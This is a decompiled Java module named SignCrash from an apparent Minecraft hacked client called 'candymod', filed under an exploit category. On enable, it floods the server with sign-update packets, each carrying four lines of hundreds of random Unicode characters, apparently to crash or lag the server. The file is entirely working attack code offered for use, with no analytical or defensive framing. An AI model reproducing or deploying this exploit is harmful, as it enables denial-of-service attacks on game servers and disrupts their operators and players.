//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\user\Desktop\1.12 stable mappings"!

//Decompiled by Procyon!

package cc.candy.candymod.module.crash;

import cc.candy.candymod.module.*;
import net.minecraft.util.text.*;
import net.minecraft.network.play.client.*;
import net.minecraft.network.*;
import java.util.*;

public class SignCrash extends Module
{
    public SignCrash() {
        super("SignCrash", Categories.EXPLOIT, false, false);
    }
    
    @Override
    public void onEnable() {
        if (this.nullCheck()) {
            return;
        }
        for (int i = 0; i < 38; ++i) {
            final ITextComponent[] components = { (ITextComponent)new TextComponentString(rndBinStr(598)), (ITextComponent)new TextComponentString(rndBinStr(598)), (ITextComponent)new TextComponentString(rndBinStr(598)), (ITextComponent)new TextComponentString(rndBinStr(598)) };
            final CPacketUpdateSign p = new CPacketUpdateSign(SignCrash.mc.player.getPosition(), components);
            SignCrash.mc.player.connection.sendPacket((Packet)p);
        }
    }
    
    public static String rndBinStr(final int size) {
        final StringBuilder end = new StringBuilder();
        for (int i = 0; i < size; ++i) {
            end.append((char)new Random().nextInt(65535));
        }
        return end.toString();
    }
}
